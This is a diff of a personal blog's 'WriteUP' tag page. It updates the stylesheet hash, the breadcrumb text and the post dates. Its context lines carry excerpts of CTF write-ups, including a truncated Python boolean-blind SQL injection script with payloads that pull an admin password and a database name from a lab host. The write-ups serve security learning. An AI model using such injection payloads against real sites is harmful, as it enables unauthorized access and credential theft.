@@ -11,7 +11,7 @@
 <meta name=google-site-verification content="XYZabc">
 <meta name=yandex-verification content="XYZabc">
 <meta name=msvalidate.01 content="XYZabc">
-<link href=/assets/css/stylesheet.min.d1b8fceefc58b2a1a91017ff7af9add8c97cc2f6290f76a10a91dae4bc1c45d2.css integrity="sha256-0bj87vxYsqGpEBf/evmt2Ml8wvYpD3ahCpHa5LwcRdI=" rel="preload stylesheet" as=style>
+<link href=/assets/css/stylesheet.min.22e11df5b9fa62e23287ab05fa8d4cfb620bd508f25c35c7f414f95019d21377.css integrity="sha256-IuEd9bn6YuIyh6sF+o1M+2IL1QjyXDXH9BT5UBnSE3c=" rel="preload stylesheet" as=style>
 <link rel=icon href=https://shenyiming.life/favicon.ico>
 <link rel=icon type=image/png sizes=16x16 href=https://shenyiming.life/favicon-16x16.png>
 <link rel=icon type=image/png sizes=32x32 href=https://shenyiming.life/favicon-32x32.png>
@@ -92,7 +92,7 @@
 <main class=main>
 <header class=page-header>
 <div class=breadcrumbs>
-<a href=https://shenyiming.life>Home</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/tags/>标签</a>
+<a href=https://shenyiming.life>首页</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/tags/>标签</a>
 </div>
 <h1>WriteUP</h1>
 </header>
@@ -135,7 +135,7 @@ bugkuctf
 #布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = "admin'^((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)^1#" % (i, ord(j)) #屏蔽了","，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&lt;>表示不等号 #^表示异或 payload2= "admin123'or((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)#"%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= "admin123'or((ascii(mid((select(database()))from(%s))))&lt;>%s)#"%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests....</p>
 </section>
 <footer class=entry-footer>
-October 24, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+October 24, 2021&nbsp;·&nbsp;October 24, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
 </footer>
 <a class=entry-link aria-label="post link to Bugku-SQL注入-WriteUP" href=https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/></a>
 </article>
@@ -163,7 +163,7 @@ git log # 查看提交记录（版本号） git status # 查看本地修改记�
 import requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests....</p>
 </section>
 <footer class=entry-footer>
-October 21, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
+October 21, 2021&nbsp;·&nbsp;October 22, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
 </footer>
 <a class=entry-link aria-label="post link to CNSS Recruit-Web Write UP" href=https://shenyiming.life/post/14.cnss-recruit-web-write-up/></a>
 </article>
@@ -194,7 +194,7 @@ You are not VIP,I will give flag to VIP!
 4. 2048 打开环境，发现是一个2048小游戏...</p>
 </section>
 <footer class=entry-footer>
-August 19, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
+August 19, 2021&nbsp;·&nbsp;December 11, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
 </footer>
 <a class=entry-link aria-label="post link to MoeCTF 2021 西电新生赛WP" href=https://shenyiming.life/post/12.moectf-web-write-up/></a>
 </article>
